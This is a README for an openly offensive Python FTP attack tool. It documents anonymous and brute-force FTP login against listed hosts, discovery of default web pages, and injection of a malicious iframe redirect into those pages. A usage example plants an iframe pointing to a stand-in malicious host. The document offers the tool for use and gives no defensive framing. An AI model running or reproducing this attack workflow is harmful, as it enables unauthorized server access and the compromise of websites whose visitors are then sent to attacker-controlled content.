# FTP Attack Script

This script attempts to log into an FTP server either using anonymous login or brute-force with a list of username and password combinations. If successful, it looks for default web pages and injects a specified malicious redirect.

## Features

- Anonymous FTP login.
- Brute-force login using a list of username/password combinations.
- List directory contents and identify default web pages.
- Inject malicious IFrame into identified web pages.

## Prerequisites

- Python 3.x

## Usage

Run the script with the following command-line arguments:

- `-H`: Specify the target host(s), separated by commas.
- `-f`: Specify the file containing username/password combinations (optional).
- `-r`: Specify the redirection page (malicious IFrame).

### Example

python3 ftp_attack.py -H 192.168.1.100 -r '<iframe src="http://malicious.com"></iframe>' -f userpass.txt
